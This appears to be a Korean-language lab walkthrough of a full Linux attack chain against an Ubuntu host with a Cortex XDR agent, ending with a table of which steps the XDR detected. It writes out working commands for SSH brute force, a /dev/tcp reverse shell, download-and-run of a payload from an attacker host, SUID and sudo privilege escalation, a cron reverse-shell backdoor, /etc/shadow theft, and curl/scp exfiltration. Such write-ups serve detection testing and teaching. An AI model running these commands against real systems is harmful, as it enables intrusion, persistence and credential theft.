# Ubuntu 공격 체인 — 상세 분석

> **환경**: Ubuntu 14.04 LTS · Cortex XDR 에이전트 설치  
> **호스트명**: `<UBUNTU_HOSTNAME>` / `<UBUNTU_IP>`  
> **공격자 (Kali)**: `<KALI_IP>`  
> **목표**: 초기 접근 → 루트 권한 획득 → 후속 공격 6개 브랜치

---

## 공격 흐름 요약

```
[RECON]       Nmap으로 열린 포트/서비스 확인
    │
    ▼
[INIT ACCESS] SSH 브루트포스로 크레덴셜 획득 → 로그인
    │
    ▼
[EXECUTION]   리버스쉘 생성 → 공격자 서버로 역방향 연결
    │
    ▼
[PRIV ESC]    SUID 바이너리 악용 → root 권한 획득
    │
    ├─▶ [CRED]     /etc/shadow 덤프 → 오프라인 크랙
    ├─▶ [PERSIST]  Cron 백도어, SSH 키 심기
    ├─▶ [LOLBIN]   find/curl/tar 시스템 도구 악용
    ├─▶ [DATA]     민감 파일 수집
    ├─▶ [LATERAL]  내부망 피벗
    └─▶ [EXFIL]    수집 파일 외부 유출
```

---

## 1단계 — 정찰 (Reconnaissance)
**MITRE**: T1595, T1046

공격 전 타겟 시스템의 정보를 수집하는 단계. 어떤 포트가 열려있고, 어떤 서비스가 돌고 있는지 파악한다.

---

### 기법 1 — 포트 스캔

```bash
nmap -sV -p- <target>
```

| 옵션 | 의미 |
|------|------|
| `-sV` | 열린 포트의 서비스 버전까지 확인 |
| `-p-` | 1번~65535번 전체 포트 스캔 |

**왜 하냐**: 방화벽에 막혀있는 포트, 비표준 포트에서 돌고 있는 서비스를 찾기 위해. 예를 들어 SSH가 기본 22번이 아닌 다른 포트에 있을 수도 있음.

**결과 예시**:
```
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.52
3306/tcp open  mysql   MySQL 8.0.33
```

---

### 기법 2 — 서비스 배너 열거

```bash
nmap -sV --script=banner <target>
```

**배너(Banner)** = 서비스가 처음 연결 시 보내는 자기소개 문자열.  
"나는 OpenSSH 9.6 이고 Ubuntu에서 돌고 있어요" 같은 정보.

**왜 위험하냐**: 버전 정보가 노출되면 해당 버전의 취약점(CVE)을 바로 검색해서 익스플로잇 가능.

---

### 기법 3 — SSH 버전 확인

```bash
nc <target> 22
```

`nc`(Netcat) = 네트워크 연결 도구. TCP 포트에 직접 연결해서 배너를 수동으로 확인.

```
SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16
```

---

## 2단계 — 초기 접근 (Initial Access)
**MITRE**: T1110.001

정찰에서 파악한 SSH 서비스에 브루트포스 공격으로 크레덴셜을 획득하는 단계.

---

### 기법 4 — SSH 브루트포스

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>
```

| 옵션 | 의미 |
|------|------|
| `-l root` | 사용자명 고정 (root) |
| `-P rockyou.txt` | 패스워드 목록 파일 |
| `ssh://<target>` | SSH 프로토콜로 공격 |

**Hydra** = 자동으로 수백만 개의 패스워드를 빠르게 시도해주는 브루트포스 툴.

**rockyou.txt** = 2009년 RockYou 사이트 해킹으로 유출된 1,400만 개 실제 패스워드 모음. 사람들이 실제로 쓰는 패스워드라 성공률이 높음.

**흐름**:
```
Hydra가 시도:
  root : 123456    → 실패
  root : password  → 실패
  root : 123       → 성공! ← 크레덴셜 획득
```

---

### 기법 5 — SSH 로그인

```bash
ssh root@<target>
```

획득한 크레덴셜로 정상 로그인. 이 시점부터 타겟 서버 내부에 접근 가능.

---

## 3단계 — 실행 (Execution)
**MITRE**: T1059.004

서버 내부에서 악성 명령/페이로드를 실행하는 단계.

---

### 기법 6 — Bash 리버스쉘

```bash
bash -i >& /dev/tcp/<attacker>/4444 0>&1
```

| 부분 | 의미 |
|------|------|
| `bash -i` | 인터랙티브 bash 쉘 실행 |
| `/dev/tcp/<attacker>/4444` | 공격자 IP의 4444 포트로 TCP 연결 |
| `>& ... 0>&1` | 입력/출력/에러를 모두 그 연결로 리다이렉트 |

**리버스쉘**: 타겟이 공격자한테 먼저 연결하는 역방향 쉘.  
방화벽은 보통 **아웃바운드(나가는 연결)는 허용**하기 때문에 통과 가능.

```
[공격자 Kali]           [Ubuntu 타겟]
nc -lvnp 4444 대기  ←── bash -i >& /dev/tcp/kali/4444
연결 수립
쉘 명령 입력 →──────────→ 타겟에서 실행
결과 ←──────────────────── 돌아옴
```

---

### 기법 7 — 페이로드 다운로드 후 실행

```bash
curl http://<attacker>/payload.sh -o /tmp/p.sh && chmod +x /tmp/p.sh && /tmp/p.sh
```

| 부분 | 의미 |
|------|------|
| `curl ... -o /tmp/p.sh` | 공격자 서버에서 스크립트 다운로드 |
| `chmod +x` | 실행 권한 부여 |
| `/tmp/p.sh` | 실행 |

**왜 /tmp 쓰냐**: /tmp는 모든 사용자가 쓸 수 있는 디렉토리. 권한 없어도 파일 생성 가능.

---

### 기법 8 — TTY 업그레이드

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

리버스쉘은 처음에 불안정한 "dumb shell" 상태. `pty.spawn`으로 **완전한 인터랙티브 터미널**로 업그레이드.

업그레이드 전: `su`, `sudo`, `vi` 같은 명령어 사용 불가  
업그레이드 후: 정상 터미널처럼 모든 명령어 사용 가능

---

## 4단계 — 권한 상승 (Privilege Escalation)
**MITRE**: T1548.001, T1548.003

일반 유저 권한에서 root 권한으로 올라가는 단계.

---

### 기법 9 — SUID 바이너리 탐색

```bash
find / -perm -4000 -type f 2>/dev/null
```

| 부분 | 의미 |
|------|------|
| `-perm -4000` | SUID 비트가 설정된 파일 |
| `-type f` | 파일만 (디렉토리 제외) |
| `2>/dev/null` | 에러 메시지 버리기 |

**SUID(Set User ID)**: 이 비트가 설정된 파일은 **파일 소유자의 권한으로 실행**됨.  
예) `/bin/bash`에 SUID + 소유자 root → 누가 실행해도 root 권한으로 실행됨.

---

### 기법 10 — SUID bash 악용

```bash
/bin/bash -p
```

`-p` 옵션 = "privilege 모드" → SUID로 설정된 경우 **소유자(root) 권한 그대로 유지**

```
$ id
uid=1000(sshuser) gid=1000(sshuser)

$ /bin/bash -p

# id
uid=1000(sshuser) gid=1000(sshuser) euid=0(root)  ← 실질적 root
```

---

### 기법 11 — sudo 권한 확인

```bash
sudo -l
```

현재 사용자가 sudo로 실행할 수 있는 명령어 목록 출력.

```
(ALL) NOPASSWD: /usr/bin/find   ← 패스워드 없이 find를 root로 실행 가능
```

이런 미스컨픽이 있으면 바로 root 탈취 가능.

---

### 기법 12 — sudo find 악용

```bash
sudo find . -exec /bin/bash \; -quit
```

| 부분 | 의미 |
|------|------|
| `sudo find` | root 권한으로 find 실행 |
| `-exec /bin/bash \;` | find가 찾은 파일마다 bash 실행 |
| `-quit` | 첫 번째 실행 후 종료 |

**find는 `-exec`로 명령어를 실행할 수 있음**. sudo 권한으로 find를 쓸 수 있다면 find를 통해 bash를 root로 실행 가능.

```
일반 사용자 → sudo find (허용됨) → find가 bash 실행 → root 쉘
```

---

### 기법 13 — /etc/passwd 직접 수정

```bash
openssl passwd -1 -salt xyz hacked
# 출력: $1$xyz$해시값

echo 'hacker:$1$xyz$해시값:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**원리**:
- `/etc/passwd`에서 3번째 필드가 `0` = UID 0 = root
- root 권한 있으면 /etc/passwd 직접 쓰기 가능
- 새 계정을 UID 0으로 추가 → root 계정 추가

---

## 5-A단계 — 자격증명 덤프 (Credential Access)
**MITRE**: T1003.008

---

### 기법 14 — /etc/shadow 덤프

```bash
cat /etc/shadow
```

**shadow 파일** = 리눅스의 패스워드 해시 저장 파일.  
root만 읽을 수 있어서, root 권한 획득 후에 접근 가능.

```
root:$6$salt$해시값:19000:0:99999:7:::
sshuser:$6$PHufm$nK5y3yo...:19000:0:99999:7:::
webadmin:$6$HPJsTctq$vKriEZ9g...:19000:0:99999:7:::
```

---

### 기법 15 — 오프라인 크랙

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

**왜 오프라인이냐**: 서버에서 직접 시도하면 로그가 남고 잠길 수 있음.  
해시만 가져와서 **공격자 서버에서 로컬로 크랙**.

**John the Ripper 동작 원리**:
```
rockyou.txt에서 단어 읽기
    ↓
같은 알고리즘으로 해시 생성
    ↓
shadow 파일의 해시와 비교
    ↓
일치하면 → 평문 패스워드 발견
```

**결과**:
```
sshuser   : 123        (크랙됨)
webadmin  : admin123   (크랙됨)
```

---

### 기법 16 — SSH 개인키 탈취

```bash
cat /root/.ssh/id_rsa
```

SSH 개인키를 가져오면 패스워드 없이 해당 키가 등록된 **모든 서버에 접속 가능**.  
내부망의 다른 서버들이 이 키를 신뢰하고 있을 수 있음.

---

## 5-B단계 — 지속성 (Persistence)
**MITRE**: T1053.003, T1098.004

서버가 재부팅되거나 접속이 끊겨도 다시 접근할 수 있도록 백도어를 심는 단계.

---

### 기법 17 — Cron 백도어

```bash
echo "* * * * * root bash -i >& /dev/tcp/<attacker>/5555 0>&1" >> /etc/crontab
```

**Cron**: 리눅스의 작업 스케줄러. 지정한 시간마다 명령어를 자동 실행.

**`* * * * *`** = 매 1분마다 실행

**효과**:
```
매 1분마다 타겟 서버가 공격자한테 자동으로 역방향 연결
→ 리버스쉘 세션이 끊겨도 1분 후 자동 재연결
→ 서버 재부팅 후에도 자동 실행
```

---

### 기법 18 — SSH 인가키 추가

```bash
echo "<공격자_공개키>" >> /root/.ssh/authorized_keys
```

**SSH 키 인증 원리**:
```
authorized_keys에 공개키 등록
    ↓
공격자가 개인키로 접속 시도
    ↓
서버가 공개키로 검증 → 패스워드 없이 로그인 허용
```

**왜 위험하냐**: 패스워드 바꿔도 소용없음. 키만 있으면 영구 접속 가능.

---

### 기법 19 — 히든 유저 생성

```bash
useradd -m -s /bin/bash -G sudo backdoor
echo 'backdoor:password' | chpasswd
```

| 옵션 | 의미 |
|------|------|
| `-m` | 홈 디렉토리 생성 |
| `-s /bin/bash` | bash 쉘 사용 |
| `-G sudo` | sudo 그룹 추가 (관리자 권한) |

일반 계정처럼 보이지만 sudo 그룹이라 root 권한 사용 가능.

---

## 5-C단계 — LOLBin 악용 (Living off the Land)
**MITRE**: T1218

**LOLBin**: "Living Off the Land Binaries" = **시스템에 원래 있는 도구를 악용**.  
별도 악성 툴 없이 기본 시스템 명령어만으로 공격. 탐지 어려움.

---

### 기법 20 — find로 파일 수집

```bash
find /etc -name "*.conf" -exec cp {} /tmp/loot/ \;
```

`find`의 `-exec` 옵션으로 찾은 파일을 `/tmp/loot/`에 복사.  
설정 파일들에 DB 패스워드, API 키 같은 민감 정보가 있을 수 있음.

---

### 기법 21 — curl로 C2 전송

```bash
curl -d @/etc/shadow http://<attacker>/collect
```

| 부분 | 의미 |
|------|------|
| `-d @파일` | 파일 내용을 HTTP POST body로 전송 |
| `http://<attacker>/collect` | 공격자 서버의 수집 엔드포인트 |

**C2(Command & Control)**: 공격자가 운영하는 서버. 탈취한 데이터 수집, 명령 하달에 사용.

---

### 기법 22 — tar로 아카이빙

```bash
tar czf /tmp/loot.tgz /etc /home /var/log
```

| 옵션 | 의미 |
|------|------|
| `c` | 아카이브 생성 |
| `z` | gzip 압축 |
| `f` | 파일명 지정 |

중요 디렉토리 전체를 하나의 압축 파일로 묶어서 한 번에 유출 준비.

---

## 5-D단계 — 데이터 수집 (Collection)
**MITRE**: T1005, T1083

---

### 기법 23 — 민감 파일 탐색

```bash
find / -name "*.pem" -o -name "*.key" -o -name "*.env" 2>/dev/null
```

`-o` = OR 조건. 인증서(`.pem`), 개인키(`.key`), 환경변수 파일(`.env`) 탐색.  
`.env`에는 DB 패스워드, AWS 키, API 토큰 등이 평문으로 있는 경우가 많음.

---

### 기법 24 — 하드코딩 크레덴셜 검색

```bash
grep -r "password" /var/www/ /opt/ 2>/dev/null
```

웹 소스코드나 설정파일에 패스워드가 평문으로 박혀있는 경우를 찾음.

```php
// 이런 코드 찾기
$db_password = "mysecretpassword123";
```

---

### 기법 25 — 히스토리 수집

```bash
cat /root/.bash_history /home/*/.bash_history
```

사용자가 과거에 입력한 명령어 목록. SSH 접속 명령어에 패스워드가 포함된 경우도 있음.

```
ssh admin@192.168.1.10           ← 내부망 서버 주소 파악
mysql -u root -pSecretPass123    ← DB 패스워드 노출
```

---

## 5-E단계 — 내부망 이동 (Lateral Movement)
**MITRE**: T1021.004, T1018

타겟 서버를 발판(피벗 포인트)으로 내부망의 다른 서버로 이동하는 단계.

---

### 기법 26 — 내부망 스캔

```bash
nmap -sn 192.168.x.0/24
```

`-sn` = ping 스캔 (포트 스캔 없이 호스트 존재 여부만 확인).  
어떤 내부 서버들이 존재하는지 파악.

---

### 기법 27 — SSH 피벗

```bash
ssh -i /root/.ssh/id_rsa user@<internal_server>
```

앞서 탈취한 SSH 개인키로 내부망 서버에 접속.  
외부에서는 직접 접근 불가능한 서버도 내부망 피벗을 통해 접근 가능.

```
[공격자] → (인터넷) → [Ubuntu 타겟] → (내부망) → [내부 서버들]
                          피벗 포인트
```

---

### 기법 28 — SSH 터널링

```bash
ssh -L 8080:internal_server:80 root@<pivot>
```

| 부분 | 의미 |
|------|------|
| `-L` | 로컬 포트 포워딩 |
| `8080` | 공격자 로컬 포트 |
| `internal_server:80` | 내부망 서버의 80 포트 |

공격자 PC의 8080 포트로 접속하면 내부망 서버의 80 포트에 연결됨.  
외부에서 접근 불가능한 내부 서비스를 공격자 PC에서 직접 접근 가능.

---

## 5-F단계 — 데이터 유출 (Exfiltration)
**MITRE**: T1048

---

### 기법 29 — SCP 유출

```bash
scp /tmp/loot.tgz attacker@<c2>:/exfil/
```

**SCP(Secure Copy)** = SSH 기반 파일 전송. 암호화되어 전송되므로 내용 탐지 어려움.

---

### 기법 30 — HTTP 업로드

```bash
curl -F "file=@/tmp/loot.tgz" http://<attacker>/upload
```

HTTP(S)를 통한 파일 업로드. 일반 웹 트래픽처럼 보여서 탐지 어려움.

---

## XDR 탐지 결과 요약

| 공격 단계 | 탐지 | 탐지 규칙 |
|---------|------|---------|
| SSH 브루트포스 | ✅ | 짧은 시간 내 다수 로그인 실패 |
| SUID bash 실행 | ✅ | 비정상적인 SUID 바이너리 실행 |
| /etc/shadow 읽기 | ✅ | 민감 파일 접근 |
| Cron 백도어 등록 | ✅ | /etc/crontab 수정 |
| 리버스쉘 (`/dev/tcp`) | ✅ | bash 프로세스의 외부 TCP 연결 |
| authorized_keys 수정 | ✅ | SSH 키 파일 변경 |
| tar 대량 아카이빙 | ⚠️ | 대량 파일 접근 (부분 탐지) |
| find/curl LOLBin | ⚠️ | 비정상 프로세스 체인 (부분 탐지) |
